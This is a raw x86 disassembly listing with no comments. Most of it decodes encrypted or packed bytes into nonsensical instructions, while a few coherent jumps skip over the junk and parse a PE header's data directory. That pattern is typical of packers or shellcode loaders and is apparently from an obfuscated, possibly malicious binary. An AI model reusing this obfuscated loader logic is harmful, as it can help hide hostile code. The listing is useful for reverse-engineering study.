  40bd75:	mov    BYTE PTR [ebx],0xc0
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd8c:	aad    0x16
  40bd8e:	mov    DWORD PTR [ecx+0x2e7e7efc],edi
  40bd94:	jge    0x40be14
  40bd96:	jle    0x40bdc0
  40bd98:	(bad)  [edx+0x5893744f]
  40bd9e:	pop    ebx
  40bd9f:	push   edx
  40bda0:	jns    0x40bd52
  40bda2:	les    edi,FWORD PTR [ebx]
  40bda4:	jnp    0x40bd78
  40bda6:	sar    BYTE PTR [ecx+0x57aca669],0xed
  40bdad:	dec    eax
  40bdae:	jns    0x40be2b
  40bdb0:	sub    BYTE PTR [ebx-0x37],dh
  40bdb3:	outs   dx,DWORD PTR ds:[esi]
  40bdb4:	mov    dh,BYTE PTR [esi-0x2c]
  40bdb7:	ss retf 0x5e4f
  40bdbb:	cld    
  40bdbc:	sti    
  40bdbd:	lock pop ss
  40bdbf:	mov    ebp,0xd57108fe
  40bdc4:	xchg   BYTE PTR [ebx+0x4e89cfbc],cl
  40bdca:	mov    ss,WORD PTR [ebp-0x74b85b3f]
  40bdd0:	jns    0x40be36
  40bdd2:	mov    esp,DWORD PTR [eax-0x9d5308c]
  40bdd8:	pop    ebp
  40bdd9:	push   ecx
  40bdda:	xor    ah,BYTE PTR [edx-0x28b0eafd]
  40bde0:	dec    esp
  40bde1:	or     al,0x80
  40bde3:	(bad)  
  40bde4:	retf   
  40bde5:	jnp    0x40bdd8
  40bde7:	fcmovbe st,st(6)
  40bde9:	sbb    eax,0xcd59752c
  40bdee:	push   ds
  40bdef:	popa   
  40bdf0:	push   eax
  40bdf1:	push   cs
  40bdf2:	iret   
  40bdf3:	cdq    
  40bdf4:	sbb    ah,bl
  40bdf6:	pop    eax
  40bdf7:	cmp    eax,0x1a192846
  40bdfc:	and    eax,0x58f6c602
  40be01:	inc    esi
  40be02:	push   edx
  40be03:	adc    DWORD PTR [edx+0x61f48b4a],0xffffff81
  40be0a:	mov    eax,ds:0x38e0d75b
  40be0f:	inc    eax
  40be10:	cmp    al,0x92
  40be12:	inc    esp
  40be13:	or     esp,DWORD PTR [ecx]
  40be15:	(bad)  [ecx]
  40be17:	xor    al,0xb6
  40be19:	dec    ecx
  40be1a:	je     0x40be15
  40be1c:	mov    ch,0x55
  40be1e:	call   0x83c9ef59
  40be23:	or     ebp,DWORD PTR [ebx+0xe]
  40be26:	push   ebp
  40be27:	sbb    BYTE PTR [ebx+esi*8],cl
  40be2a:	xor    al,0x7c
  40be2c:	jne    0x40be73
  40be2e:	je     0x40bea8
  40be30:	pop    edi
  40be31:	mov    edx,DWORD PTR [edx]
  40be33:	mov    esi,0x51e48d7b
  40be38:	addr16 aad 0x4d
  40be3b:	aas    
  40be3c:	pop    es
  40be3d:	mov    bl,0xc5
  40be3f:	jmp    0x8bc4:0xf166be39
  40be46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be47:	cmc    
  40be48:	pop    esp
  40be49:	mov    ebx,0x1f00a591
  40be4e:	enter  0x5ba7,0x52
  40be52:	mov    ecx,0xf502cf18
  40be57:	adc    DWORD PTR [eax],0x71354175
  40be5d:	mov    edi,0xa9347ce9
  40be62:	rcr    DWORD PTR [ebx+0x63],1
  40be65:	loopne 0x40bed9
  40be67:	pop    ebx
  40be68:	jbe    0x40bea9
  40be6a:	repnz mov esi,DWORD PTR ds:[esi-0x42]
  40be6f:	sbb    esi,ebp
  40be71:	rol    eax,0xaf
  40be74:	lds    esi,FWORD PTR [esi+0x8]
  40be77:	fst    st(2)
  40be79:	into   
  40be7a:	dec    edi
  40be7b:	daa    
  40be7c:	sub    esi,edi
  40be7e:	lea    ecx,[edx+eiz*2]
  40be81:	sub    BYTE PTR [ebp+0x3c],dh
  40be84:	push   edx
  40be85:	outs   dx,DWORD PTR ds:[esi]
  40be86:	cwde   
  40be87:	jno    0x40bec5
  40be89:	aas    
  40be8a:	xchg   ebp,eax
  40be8b:	(bad)  
  40be8c:	jmp    0x40bef9
  40be8e:	push   edi
  40be8f:	sti    
  40be90:	dec    eax
  40be91:	add    DWORD PTR [ebp+0x3466921f],0xffffffab
  40be98:	push   ecx
  40be99:	inc    ebp
  40be9a:	aaa    
  40be9b:	cmp    DWORD PTR [edx],0x6d8ba716
  40bea1:	jmp    0xeb57:0x33fa60c8
  40bea8:	idiv   edi
  40beaa:	sbb    edi,DWORD PTR [edi-0x2272ce57]
  40beb0:	cld    
  40beb1:	jle    0x40bea6
  40beb3:	fistp  WORD PTR [eax+0x13]
  40beb6:	and    al,bh
  40beb8:	mov    DWORD PTR ds:0xb82258b5,ebx
  40bebe:	fistp  DWORD PTR [esi+0x1fbff152]
  40bec4:	daa    
  40bec5:	cli    
  40bec6:	out    dx,eax
  40bec7:	mov    ah,0xce
  40bec9:	dec    ebx
  40beca:	add    DWORD PTR [eax+esi*4-0x1d],ebx
  40bece:	fwait
  40becf:	inc    ecx
  40bed0:	sti    
  40bed1:	mov    ebx,0xe713af36
  40bed6:	xor    eax,0x8573e6d0
  40bedb:	loope  0x40becf
  40bedd:	jb     0x40bef8
  40bedf:	mov    ebp,edi
  40bee1:	adc    ecx,DWORD PTR [ecx]
  40bee3:	ins    DWORD PTR es:[edi],dx
  40bee4:	jle    0x40bf31
  40bee6:	mov    esp,0xedda2932
  40beeb:	test   DWORD PTR [eax],edx
  40beed:	(bad)  
  40beee:	in     al,0x33
  40bef0:	mov    eax,0x893ab02f
  40bef5:	hlt    
  40bef6:	add    bl,ch
  40bef8:	mov    ecx,0xef6ebb13
  40befd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40befe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beff:	out    0xcb,al
  40bf01:	outs   dx,BYTE PTR ds:[esi]
  40bf02:	mov    dh,dh
  40bf04:	pop    edx
  40bf05:	ret    
  40bf06:	adc    esi,edi
  40bf08:	and    DWORD PTR [esi+0x59d069c],ebx
  40bf0e:	test   BYTE PTR [ebp+edx*1-0x6cda1b7],cl
  40bf15:	pusha  
  40bf16:	mov    BYTE PTR [edi],cl
  40bf18:	leave  
  40bf19:	cwde   
  40bf1a:	mov    DWORD PTR [edx],esp
  40bf1c:	daa    
  40bf1d:	jmp    0xa6c91fe0
  40bf22:	jbe    0x40bf4a
  40bf24:	popf   
  40bf25:	cmp    al,0x6f
  40bf27:	(bad)  
  40bf28:	fadd   DWORD PTR [ecx-0x52ef8846]
  40bf2e:	jbe    0x40beb2
  40bf30:	outs   dx,DWORD PTR ds:[esi]
  40bf31:	mov    bh,0xe8
  40bf33:	xchg   esi,eax
  40bf34:	out    dx,al
  40bf35:	push   esi
  40bf36:	xor    bh,BYTE PTR [ecx-0x678c5030]
  40bf3c:	or     al,0xce
  40bf3e:	call   0xd6055967
  40bf43:	hlt    
  40bf44:	or     BYTE PTR ds:0x2e5a2ddb,0x8f
  40bf4b:	bound  eax,QWORD PTR [ebx-0x7b4cf9b2]
  40bf51:	enter  0xd2f6,0x66
  40bf55:	jl     0x40bf44
  40bf57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf58:	(bad)  
  40bf59:	jl     0x40bf3b
  40bf5b:	jae    0x40bfc9
  40bf5d:	lahf   
  40bf5e:	imul   edx,DWORD PTR [eax],0x23
  40bf61:	add    dl,BYTE PTR [edx]
  40bf63:	and    DWORD PTR es:[edi+0x3a],eax
  40bf67:	cwde   
  40bf68:	fdiv   st(0),st
  40bf6a:	dec    ebp
  40bf6b:	mov    ebp,?
  40bf6d:	dec    esp
  40bf6e:	mov    dl,0x23
  40bf70:	inc    esp
  40bf71:	inc    eax
  40bf72:	popf   
  40bf73:	cmc    
  40bf74:	aaa    
  40bf75:	and    al,0xf8
  40bf77:	mov    ch,0x5f
  40bf79:	inc    eax
  40bf7a:	inc    esi
  40bf7b:	mov    ebx,0xa9f095f5
  40bf80:	sub    DWORD PTR [eax-0x20654b09],ebx
  40bf86:	or     DWORD PTR [ebx],eax
  40bf88:	xor    BYTE PTR [edx-0x19],ah
  40bf8b:	and    ebp,DWORD PTR [eax+0x22]
  40bf8e:	push   ebp
  40bf8f:	scas   eax,DWORD PTR es:[edi]
  40bf90:	mov    cl,0xd7
  40bf92:	leave  
  40bf93:	sub    eax,esi
  40bf95:	mov    DWORD PTR [ebp-0x4eae0dcf],eax
  40bf9b:	sub    al,0x48
  40bf9d:	mov    ebp,0xad763e28
  40bfa2:	retf   
  40bfa3:	inc    ebx
  40bfa4:	sub    bh,0xd8
  40bfa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfa8:	mov    bl,0x23
  40bfaa:	sahf   
  40bfab:	push   ds
  40bfac:	ins    DWORD PTR es:[edi],dx
  40bfad:	lds    esp,FWORD PTR [ebx]
  40bfaf:	cdq    
  40bfb0:	mov    WORD PTR [edx-0x37],?
  40bfb3:	xchg   edi,eax
  40bfb4:	jnp    0x40c00b
  40bfb6:	adc    al,0x3b
  40bfb8:	mov    es,WORD PTR [edx+0x50]
  40bfbb:	push   0xb6310979
  40bfc0:	sbb    BYTE PTR [edx-0x37],dl
  40bfc3:	pop    eax
  40bfc4:	add    al,0xc3
  40bfc6:	xor    eax,ebp
  40bfc8:	ss xor ecx,ecx
  40bfcb:	xlat   BYTE PTR ds:[ebx]
  40bfcc:	cmp    eax,DWORD PTR [edx]
  40bfce:	push   esp
  40bfcf:	aas    
  40bfd0:	pusha  
  40bfd1:	cmp    DWORD PTR [ebx],esi
  40bfd3:	cmp    edx,edi
  40bfd5:	jl     0x40bfa0
  40bfd7:	loope  0x40c028
  40bfd9:	push   ecx
  40bfda:	push   ds
  40bfdb:	ss dec edx
  40bfdd:	xchg   esi,eax
  40bfde:	retf   
  40bfdf:	push   ss
  40bfe0:	icebp  
  40bfe1:	jno    0x40bff7
  40bfe3:	cwde   
  40bfe4:	rol    BYTE PTR [edi],0x4d
  40bfe7:	sub    eax,0x5b974aa1
  40bfec:	adc    ebx,DWORD PTR [ebp-0x1d]
  40bfef:	out    0x75,eax
  40bff1:	hlt    
  40bff2:	jmp    0x40bfed
  40bff4:	and    al,0x61
  40bff6:	cmp    eax,0x5f8c7551
  40bffb:	mov    dh,0x4d
  40bffd:	test   eax,0x2e881d05
  40c002:	xchg   ecx,eax
  40c003:	push   esp
  40c004:	outs   dx,DWORD PTR ds:[esi]
  40c005:	sub    dl,dh
  40c007:	xlat   BYTE PTR ds:[ebx]
  40c008:	sbb    al,0x3e
  40c00a:	in     al,0x69
  40c00c:	push   edi
  40c00d:	(bad)  
  40c00e:	shr    BYTE PTR [esi+edx*8-0x38aa10f1],cl
  40c015:	add    al,0xe9
  40c017:	(bad)  
  40c018:	loope  0x40c064
  40c01a:	xchg   BYTE PTR [edi+ebp*1+0x14],cl
  40c01e:	fisub  DWORD PTR [esi-0x6d]
  40c021:	inc    ebp
  40c022:	jge    0x40c0a0
  40c024:	xor    cl,bh
  40c026:	add    BYTE PTR [esi+0x4a4598c3],dh
  40c02c:	scas   eax,DWORD PTR es:[edi]
  40c02d:	ds cdq 
  40c02f:	cmp    DWORD PTR [ecx+eax*2+0x71],ebp
  40c033:	and    eax,DWORD PTR ss:[ecx+edi*1+0x4d]
  40c038:	mov    dh,0x91
  40c03a:	(bad)  
  40c03b:	and    bl,BYTE PTR [edi-0x499d35db]
  40c041:	lock mov ebx,0x8acc5f3f
  40c047:	mov    edx,DWORD PTR [edx-0x1f]
  40c04a:	xor    eax,0x6556ffe
  40c050:	pop    ebp
  40c051:	in     eax,dx
  40c052:	rcr    BYTE PTR [edi+0x540b4f0],1
  40c058:	and    cl,0x3a
  40c05b:	cmp    ebx,DWORD PTR [edi]
  40c05d:	lahf   
  40c05e:	mov    eax,DWORD PTR [edx]
  40c060:	fwait
  40c061:	int3   
  40c062:	and    al,0x3
  40c064:	jecxz  0x40c0af
  40c066:	sbb    DWORD PTR [esi+0x1e99c9f8],esp
  40c06c:	sub    BYTE PTR [edx],dh
  40c06e:	sbb    eax,0x266cb4f8
  40c073:	imul   ebx,DWORD PTR [edi-0x4e6b46e2],0x35
  40c07a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c07b:	inc    edx
  40c07c:	cdq    
  40c07d:	inc    cx
  40c07f:	pop    ds
  40c080:	ins    BYTE PTR es:[edi],dx
  40c081:	dec    esp
  40c082:	xlat   BYTE PTR ds:[ebx]
  40c083:	imul   ecx
  40c085:	jmp    0xc6a6:0x56f7be42
  40c08c:	and    DWORD PTR [edi-0x5fb4ddff],edx
  40c092:	ret    0xa9d4
  40c095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c096:	fbstp  TBYTE PTR [ebx+eiz*8+0x3c8972a]
  40c09d:	sub    bh,BYTE PTR [edx]
  40c09f:	or     al,0x7d
  40c0a1:	mov    cl,0xa8
  40c0a3:	push   0x67ceaac
  40c0a8:	out    dx,al
  40c0a9:	push   0xb9205738
  40c0ae:	test   BYTE PTR [ecx+0x39],0x54
  40c0b2:	ss xor eax,0x8056fb3a
  40c0b8:	and    eax,0x170d441
  40c0bd:	js     0x40c06b
  40c0bf:	ds mov esi,0xc5c36e97
  40c0c5:	xchg   edx,eax
  40c0c6:	icebp  
  40c0c7:	sub    ecx,eax
  40c0c9:	mov    ax,WORD PTR [ebp-0x4]
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	xor    eax,0x69b7b100
  40c108:	sti    
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c0b3
  40c110:	lock jmp 0x40c111
  40c113:	mov    esi,0xdca73879
  40c118:	xor    eax,0x1aed485b
  40c11d:	int3   
  40c11e:	adc    eax,DWORD PTR [eax]
  40c120:	imul   edi,DWORD PTR [edx],0xffffffec
  40c123:	sub    eax,0xd327d5ff
  40c128:	daa    
  40c129:	in     eax,0xdf
  40c12b:	mov    DWORD PTR [esi],ebp
  40c12d:	sub    edx,0xa6d48ee5
  40c133:	fwait
  40c134:	sub    BYTE PTR [ebp+0x3f62a775],ch
  40c13a:	push   ebx
  40c13b:	aam    0x90
  40c13d:	sub    DWORD PTR [ebx-0x49f316e3],0xffffffe9
  40c144:	retf   0xbf11
  40c147:	into   
  40c148:	and    bl,BYTE PTR [ebx+0x29]
  40c14b:	add    esi,DWORD PTR [eax]
  40c14d:	scas   al,BYTE PTR es:[edi]
  40c14e:	dec    ebp
  40c14f:	xor    edx,ebx
  40c151:	mov    bl,0x12
  40c153:	pushf  
  40c154:	jle    0x40c197
  40c156:	sub    al,0xd1
  40c158:	fisttp WORD PTR [edi+0x4c4401c5]
  40c15e:	cmp    DWORD PTR [edi-0x1bbd740e],esp
  40c164:	xor    DWORD PTR [ebx+0x3fe9a895],eax
  40c16a:	in     eax,dx
  40c16b:	jno    0x40c1d0
  40c16d:	sbb    ecx,DWORD PTR [esi+ebp*4-0x5c]
  40c171:	xor    edi,DWORD PTR [edi-0x20c8a2bb]
  40c177:	pop    ss
  40c178:	stos   BYTE PTR es:[edi],al
  40c179:	fimul  DWORD PTR [eax+esi*2]
  40c17c:	jp     0x40c1a7
  40c17e:	loopne 0x40c1e4
  40c180:	xchg   ebp,eax
  40c181:	adc    ebx,DWORD PTR [ebx]
  40c183:	popa   
  40c184:	in     al,dx
  40c185:	popa   
  40c186:	jbe    0x40c120
  40c188:	call   0xa412:0xb53b0eb3
  40c18f:	mov    esi,0xb4e4fb2b
  40c194:	adc    ah,al
  40c196:	es jmp 0xe4db1a25
  40c19c:	aas    
  40c19d:	dec    ebp
  40c19e:	mov    cl,0x1
  40c1a0:	mov    dl,0xa1
  40c1a2:	dec    esi
  40c1a3:	out    0x4b,al
  40c1a5:	sub    DWORD PTR [ecx],edx
  40c1a7:	sub    BYTE PTR [edi-0x23],0x2d
  40c1ab:	shl    BYTE PTR [esp+ecx*2-0x6f],0x71
  40c1b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1b1:	hlt    
  40c1b2:	add    al,bl
  40c1b4:	cmp    al,0xc6
  40c1b6:	add    bl,BYTE PTR [ebp+0x4dcbda27]
  40c1bc:	call   0x8c9:0x5fcd13fd
  40c1c3:	gs pop ebp
  40c1c5:	mov    ds:0xc72ead72,al
  40c1cb:	dec    edi
  40c1cc:	in     al,0xeb
  40c1ce:	mov    WORD PTR [ecx],gs
  40c1d0:	imul   edx,DWORD PTR [ecx],0xffffffbe
  40c1d3:	pop    es
  40c1d4:	imul   eax,DWORD PTR [ebp+0x3ba4c10d],0x6dbd42a2
  40c1de:	and    eax,0xbc6cca82
  40c1e3:	add    BYTE PTR [edi-0x26],al
  40c1e6:	xchg   edx,eax
  40c1e7:	jno    0x40c19c
  40c1e9:	fidiv  WORD PTR [eax]
  40c1eb:	add    esp,eax
  40c1ed:	jmp    0xe0e5:0x6e05d585
  40c1f4:	neg    BYTE PTR [ebp+0x10]
  40c1f7:	popf   
  40c1f8:	jb     0x40c1de
  40c1fa:	std    
  40c1fb:	pusha  
  40c1fc:	repz xor edi,DWORD PTR [ecx]
  40c1ff:	push   0x23840b0e
  40c204:	push   cs
  40c205:	es push ecx
  40c207:	stos   DWORD PTR es:[edi],eax
  40c208:	jl     0x40c263
  40c20a:	ss sbb al,0x58
  40c20d:	scas   eax,DWORD PTR es:[edi]
  40c20e:	ror    bh,cl
  40c210:	repz xor DWORD PTR [ebp+0x33],esp
  40c214:	fadd   st,st(5)
  40c216:	pop    ecx
  40c217:	cwde   
  40c218:	jnp    0x40c20b
  40c21a:	jns    0x40c228
  40c21c:	ja     0x40c22d
  40c21e:	(bad)  
  40c21f:	xor    al,0x7f
  40c221:	call   0x7ace:0x576514ef
  40c228:	xor    dh,BYTE PTR [ecx-0x7b]
  40c22b:	sub    bl,BYTE PTR [edi+0x29]
  40c22e:	xlat   BYTE PTR ds:[ebx]
  40c22f:	cmp    edi,DWORD PTR [eax+eiz*8-0x74eab5b3]
  40c236:	in     al,0x26
  40c238:	inc    edi
  40c239:	xchg   esp,eax
  40c23a:	lds    eax,FWORD PTR ds:0x39026a70
  40c240:	mov    esi,0xa1de415a
  40c245:	or     bl,BYTE PTR [ecx+0x34]
  40c248:	js     0x40c1e8
  40c24a:	ins    DWORD PTR es:[edi],dx
  40c24b:	dec    edx
  40c24c:	test   al,0xab
  40c24e:	and    al,0x3c
  40c250:	mov    ds:0x46f34f81,al
  40c255:	shl    BYTE PTR [ecx+eiz*4-0x26],0xa0
  40c25a:	add    DWORD PTR [edx],ecx
  40c25c:	inc    esp
  40c25d:	lock push ds
  40c25f:	in     al,dx
  40c260:	mov    dh,0xae
  40c262:	les    edx,FWORD PTR [ecx]
  40c264:	imul   edi,ecx,0x76
  40c267:	pop    ss
  40c268:	jns    0x40c22a
  40c26a:	leave  
  40c26b:	dec    edi
  40c26c:	xchg   esi,eax
  40c26d:	cmp    bl,ch
  40c26f:	ja     0x40c2a5
  40c271:	popf   
  40c272:	dec    esi
  40c273:	cmp    BYTE PTR [edx+0x76f227f6],bl
  40c279:	test   dh,ah
  40c27b:	ins    DWORD PTR es:[edi],dx
  40c27c:	clc    
  40c27d:	mov    al,0xaf
  40c27f:	jecxz  0x40c2ff
  40c281:	jmp    0xd4b7661a
  40c286:	jno    0x40c214
  40c288:	push   esi
  40c289:	sbb    esi,esp
  40c28b:	(bad)  
  40c28c:	push   esp
  40c28d:	scas   eax,DWORD PTR es:[edi]
  40c28e:	dec    edx
  40c28f:	cmc    
  40c290:	mov    ch,0xb1
  40c292:	scas   al,BYTE PTR es:[edi]
  40c293:	jl     0x40c2a6
  40c295:	lods   eax,DWORD PTR ds:[esi]
  40c296:	lods   al,BYTE PTR ds:[esi]
  40c297:	repnz or al,dl
  40c29a:	mov    dl,0x69
  40c29c:	leave  
  40c29d:	or     BYTE PTR [ebx],ah
  40c29f:	jb     0x40c2f5
  40c2a1:	xchg   DWORD PTR [edx+edi*4],ecx
  40c2a4:	rcl    ch,1
  40c2a6:	test   eax,0x753ed85d
  40c2ab:	sbb    BYTE PTR [esi+0x16],0x92
  40c2af:	xor    dh,BYTE PTR [esi+0x12]
  40c2b2:	into   
  40c2b3:	mov    al,fs:0x12cf52c6
  40c2b9:	dec    esi
  40c2ba:	inc    eax
  40c2bb:	fmul   DWORD PTR [eax]
  40c2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2be:	mov    ebx,edi
  40c2c0:	adc    bl,BYTE PTR [edi+ebp*1+0x28]
  40c2c4:	bound  eax,QWORD PTR [edx]
  40c2c6:	imul   edx,DWORD PTR [ecx+0x68],0xa763f1a6
  40c2cd:	sbb    eax,0x6b768a7a
  40c2d2:	adc    cl,ah
  40c2d4:	pop    esp
  40c2d5:	jmp    0x9d84:0x60c8166f
  40c2dc:	mov    WORD PTR [edi-0x7ab8e2d0],gs
  40c2e2:	iret   
  40c2e3:	jnp    0x40c35c
  40c2e5:	mov    al,ds:0xb8ec40a5
  40c2ea:	mov    DWORD PTR [edi],ecx
  40c2ec:	xchg   bh,dh
  40c2ee:	(bad)  
  40c2ef:	or     BYTE PTR [esp+ebp*8],ch
  40c2f2:	pop    edx
  40c2f3:	and    al,0x26
  40c2f5:	outs   dx,BYTE PTR ds:[esi]
  40c2f6:	ja     0x40c290
  40c2f8:	pop    ebp
  40c2f9:	and    DWORD PTR [edi-0x37],ecx
  40c2fc:	cli    
  40c2fd:	cmp    BYTE PTR [eax+eiz*2-0x55cd732f],cl
  40c304:	mov    dl,0x7d
  40c306:	add    esp,edx
  40c308:	sub    ch,BYTE PTR [edx]
  40c30a:	mov    dl,0xd4
  40c30c:	pop    ds
  40c30d:	xor    ch,al
  40c30f:	mov    ch,0x6f
  40c311:	and    eax,0xca062f49
  40c316:	mov    BYTE PTR [ebp-0x77050e34],bh
  40c31c:	mov    ecx,0xbfcfcfd
  40c321:	dec    edi
  40c322:	adc    al,bh
  40c324:	fmul   QWORD PTR [esi+0x4c]
  40c327:	sbb    DWORD PTR [ebp+0x37],0x46d49685
  40c32e:	scas   eax,DWORD PTR es:[edi]
  40c32f:	push   0xffffff96
  40c331:	(bad)  
  40c332:	push   ds
  40c333:	repz mov ebp,0x67786359
  40c339:	in     eax,0x15
  40c33b:	dec    eax
  40c33c:	mov    DWORD PTR ds:0x23ef61ef,edi
  40c343:	shl    ecx,0x8f
  40c346:	adc    DWORD PTR [edi-0x2c],esp
  40c349:	je     0x40c329
  40c34b:	dec    ebx
  40c34c:	mov    al,0x2
  40c34e:	ret    0xd6cc
  40c351:	dec    edi
  40c352:	jp     0x40c39d
  40c354:	and    eax,0xfffffff0
  40c357:	cld    
  40c358:	push   ebp
  40c359:	call   0x3db0:0xf8e99c9b
  40c360:	imul   ch
  40c362:	xchg   DWORD PTR [edi-0x1b],ecx
  40c365:	ja     0x40c312
  40c367:	test   DWORD PTR [ebp-0x73],ebp
  40c36a:	test   eax,0xbf7cf5e5
  40c36f:	call   0x134e5419
  40c374:	pusha  
  40c375:	sbb    al,0xcf
  40c377:	(bad)  
  40c378:	es sahf 
  40c37a:	inc    ebx
  40c37b:	inc    ecx
  40c37c:	lods   al,BYTE PTR ds:[esi]
  40c37d:	push   esi
  40c37e:	pop    es
  40c37f:	pusha  
  40c380:	mov    eax,0xf1f375af
  40c385:	ds xor bl,bl
  40c388:	push   ecx
  40c389:	dec    ecx
  40c38a:	jns    0x40c36a
  40c38c:	cs and esp,ecx
  40c38f:	and    esp,DWORD PTR [esi+0x44]
  40c392:	adc    ebp,edi
  40c394:	in     eax,dx
  40c395:	sahf   
  40c396:	mov    edx,DWORD PTR [esi-0x63]
  40c399:	(bad)  
  40c39a:	push   ecx
  40c39b:	sub    eax,0xdb0f579b
  40c3a0:	ja     0x40c35a
  40c3a2:	test   ah,cl
  40c3a4:	inc    ecx
  40c3a5:	or     al,0xcd
  40c3a7:	xor    dh,BYTE PTR [eax+0x42]
  40c3aa:	jb     0x40c382
  40c3ac:	push   ebp
  40c3ad:	inc    edi
  40c3ae:	mov    es,WORD PTR ds:0x2e14ebe2
  40c3b4:	xor    DWORD PTR [ebx+eiz*1+0x6ed9028f],esp
  40c3bb:	push   ebx
  40c3bc:	xchg   edx,eax
  40c3bd:	ret    
  40c3be:	jcxz   0x40c431
  40c3c1:	arpl   WORD PTR [eax],bp
  40c3c3:	mov    al,ds:0x209d5760
  40c3c8:	shl    BYTE PTR [edi+0x7289fc7],1
  40c3ce:	and    ebx,DWORD PTR [ebx-0x4e]
  40c3d1:	jge    0x40c3eb
  40c3d3:	mov    edx,0xb05c69ba
  40c3d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3d9:	les    ebp,FWORD PTR es:[edi-0x5b807f9b]
  40c3e0:	pop    esp
  40c3e1:	cs jle 0x40c38c
  40c3e4:	xlat   BYTE PTR ds:[ebx]
  40c3e5:	les    ecx,FWORD PTR [eax+ebx*4]
  40c3e8:	mov    al,0x25
  40c3ea:	stc    
  40c3eb:	inc    esp
  40c3ec:	push   es
  40c3ed:	pushf  
  40c3ee:	les    edx,FWORD PTR [edi+0x6c]
  40c3f1:	lods   eax,DWORD PTR ds:[esi]
  40c3f2:	push   edi
  40c3f3:	jl     0x40c392
  40c3f5:	fstp   DWORD PTR [ebp+0x28b3a1f7]
  40c3fb:	enter  0x7ca,0x45
  40c3ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c400:	bound  ebx,QWORD PTR [ebx]
  40c402:	adc    BYTE PTR [eax+0xff29f03],bl
  40c408:	dec    ebp
  40c409:	pop    edi
  40c40a:	fdivr  DWORD PTR [eax]
  40c40c:	push   esi
  40c40d:	fimul  WORD PTR [eax+0x3b1cbb8e]
  40c413:	pop    edi
  40c414:	mov    eax,ds:0xbf10bbf2
  40c419:	test   al,0xf3
  40c41b:	in     eax,0x28
  40c41d:	imul   esi,esp,0x6c4006f1
  40c423:	xchg   BYTE PTR ds:0xad59d5f0,dh
  40c429:	mov    ds:0xe82fca47,eax
  40c42e:	mov    cl,0x6e
  40c430:	inc    eax
  40c431:	xor    ecx,DWORD PTR [edx+ecx*4-0x78a6cda8]
  40c438:	or     DWORD PTR [edi+0x664b911b],edx
  40c43e:	cld    
  40c43f:	lea    eax,[eax+ecx*1+0x32729b]
  40c446:	mov    WORD PTR [ebp-0x4],ax
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi+0x37]
  40c49b:	out    0xa5,al
  40c49d:	lds    ebx,FWORD PTR [ecx]
  40c49f:	xchg   DWORD PTR [esi+0x7e],edi
  40c4a2:	cs jge 0x40c523
  40c4a5:	jle    0x40c492
  40c4a7:	sub    BYTE PTR [ebx],dl
  40c4a9:	and    edx,ebp
  40c4ab:	jne    0x40c474
  40c4ad:	mov    eax,0x327557cf
  40c4b2:	in     al,dx
  40c4b3:	add    DWORD PTR [edx-0x25821385],0x423251a
  40c4bd:	mov    dh,0x62
  40c4bf:	or     DWORD PTR es:[edx],0xc31af1d8
  40c4c6:	pop    es
  40c4c7:	cmc    
  40c4c8:	ror    BYTE PTR [edx-0x23],1
  40c4cb:	dec    ebp
  40c4cc:	jne    0x40c4b8
  40c4ce:	loopne 0x40c54f
  40c4d0:	imul   eax,DWORD PTR [ecx-0x7fd2902a],0x2d
  40c4d7:	xchg   esi,eax
  40c4d8:	sub    DWORD PTR [edi+0x1e],ebp
  40c4db:	mov    bh,0x4d
  40c4dd:	pop    eax
  40c4de:	dec    ebp
  40c4df:	js     0x40c534
  40c4e1:	fimul  WORD PTR [eax+edx*1+0xf437b61]
  40c4e8:	loop   0x40c4b7
  40c4ea:	int    0x6
  40c4ec:	sub    eax,0x785a6119
  40c4f1:	push   es
  40c4f2:	xchg   edx,eax
